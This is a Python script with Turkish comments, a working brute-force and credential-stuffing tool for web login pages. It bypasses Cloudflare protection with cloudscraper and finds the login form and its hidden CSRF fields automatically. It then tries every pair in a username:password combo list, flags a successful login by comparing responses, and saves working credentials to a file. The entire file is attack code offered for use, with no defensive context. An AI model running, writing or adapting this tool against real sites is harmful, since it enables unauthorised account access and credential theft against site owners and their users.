import argparse
import cloudscraper
from bs4 import BeautifulSoup
import sys
from tqdm import tqdm
import time
from colorama import Fore, Style, init
import requests

init(autoreset=True)

# Komut satırı argümanlarını al
parser = argparse.ArgumentParser(description="Cloudflare destekli login brute force aracı (combo wordlist)")
parser.add_argument('--url', required=True, help='Hedef login sayfası URL')
parser.add_argument('--combo', required=True, help='Combo wordlist dosyası (username:password)')
parser.add_argument('--no-verify', action='store_true', help='SSL sertifika doğrulamasını atla')
args = parser.parse_args()

# SSL uyarısını bastır
if args.no_verify:
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Cloudflare korumalı siteye istek atmak için cloudscraper kullan
scraper = cloudscraper.create_scraper()
ssl_verify = not args.no_verify

try:
    response = scraper.get(args.url, verify=ssl_verify)
    if response.status_code != 200:
        print(f"[!] Hedefe erişilemedi! HTTP {response.status_code}")
        sys.exit(1)
except Exception as e:
    print(f"[!] Hedefe erişirken hata oluştu: {e}")
    sys.exit(1)

# Login formunu bul
soup = BeautifulSoup(response.text, 'html.parser')
forms = soup.find_all('form')
login_form = None
for form in forms:
    inputs = form.find_all('input')
    input_types = [i.get('type', '').lower() for i in inputs]
    if 'password' in input_types:
        login_form = form
        break

if not login_form:
    print("[!] Login formu bulunamadı!")
    sys.exit(1)

# Input alanlarını bul
input_fields = login_form.find_all('input')
user_field = None
pass_field = None
for field in input_fields:
    if field.get('type') in ['text', 'email']:
        user_field = field
    if field.get('type') == 'password':
        pass_field = field

if not user_field or not pass_field:
    print("[!] Kullanıcı adı veya şifre inputu bulunamadı!")
    sys.exit(1)

user_name = user_field.get('name') or user_field.get('id')
pass_name = pass_field.get('name') or pass_field.get('id')

print(f"[+] Login formu bulundu!")
print(f"    Kullanıcı adı inputu: {user_name}")
print(f"    Şifre inputu: {pass_name}")

# Alan uzunluklarını analiz et
user_min = int(user_field.get('minlength', 1))
user_max = int(user_field.get('maxlength', 32))
pass_min = int(pass_field.get('minlength', 1))
pass_max = int(pass_field.get('maxlength', 32))
print(f"    Kullanıcı adı uzunluğu: min={user_min}, max={user_max}")
print(f"    Şifre uzunluğu: min={pass_min}, max={pass_max}")

# Combo wordlisti oku (username:password)
combos = []
with open(args.combo, encoding='utf-8', errors='ignore') as f:
    for line in f:
        line = line.strip()
        if not line or ':' not in line:
            continue
        username, password = line.split(':', 1)
        if user_min <= len(username) <= user_max and pass_min <= len(password) <= pass_max:
            combos.append((username, password))

print(f"[+] {len(combos)} combo (username:password) yüklendi.")

total_combos = len(combos)

# Başarılı giriş tespiti için referans hata mesajı veya içerik
fail_signatures = []
# İlk yanlış denemede dönen sayfa içeriğini referans al
sample_data = {user_name: 'wronguser', pass_name: 'wrongpass'}
for field in input_fields:
    if field.get('type') not in ['text', 'email', 'password']:
        # Gizli inputlar (ör: CSRF token) varsa ekle
        name = field.get('name') or field.get('id')
        if name and field.get('value'):
            sample_data[name] = field.get('value')
try:
    fail_resp = scraper.post(args.url, data=sample_data, allow_redirects=True, verify=ssl_verify)
    fail_signatures.append(fail_resp.text[:1000])  # İlk 1000 karakteri referans al
    fail_status = fail_resp.status_code
    fail_url = fail_resp.url
except Exception as e:
    print(f"[!] Başarısız giriş referansı alınamadı, manuel kontrol gerekebilir. Hata: {e}")
    fail_status = 0
    fail_url = ""

success_count = 0
tried_count = 0
success_log = open('success.txt', 'w', encoding='utf-8')

try:
    with tqdm(total=total_combos, desc="Taranan kombinasyonlar", unit="combo") as pbar:
        for username, password in combos:
            data = {user_name: username, pass_name: password}
            # Gizli inputlar (ör: CSRF token) varsa ekle
            for field in input_fields:
                if field.get('type') not in ['text', 'email', 'password']:
                    name = field.get('name') or field.get('id')
                    if name and field.get('value'):
                        data[name] = field.get('value')
            tried_count += 1
            try:
                resp = scraper.post(args.url, data=data, allow_redirects=True, verify=ssl_verify)
            except Exception as e:
                # tqdm barında hatayı göstermek için
                pbar.set_postfix_str(f"Hata: {e}", refresh=True)
                time.sleep(0.1)
                pbar.update(1)
                continue
            # Başarı tespiti: içerik değişimi, yönlendirme, HTTP kodu
            if (resp.status_code != fail_status) or (resp.url != fail_url) or (fail_signatures and resp.text[:1000] not in fail_signatures):
                success_count += 1
                # tqdm barını durdurmadan print yapmak için
                tqdm.write(Fore.GREEN + Style.BRIGHT + f"[!!!] BAŞARILI: {username}:{password}")
                success_log.write(f"{username}:{password}\n")
                success_log.flush()
            pbar.update(1)
    print(Fore.CYAN + f"\nToplam deneme: {tried_count}, Başarılı giriş: {success_count}")
    if not success_count:
        print(Fore.YELLOW + "[!] Başarılı giriş bulunamadı.")
finally:
    success_log.close() 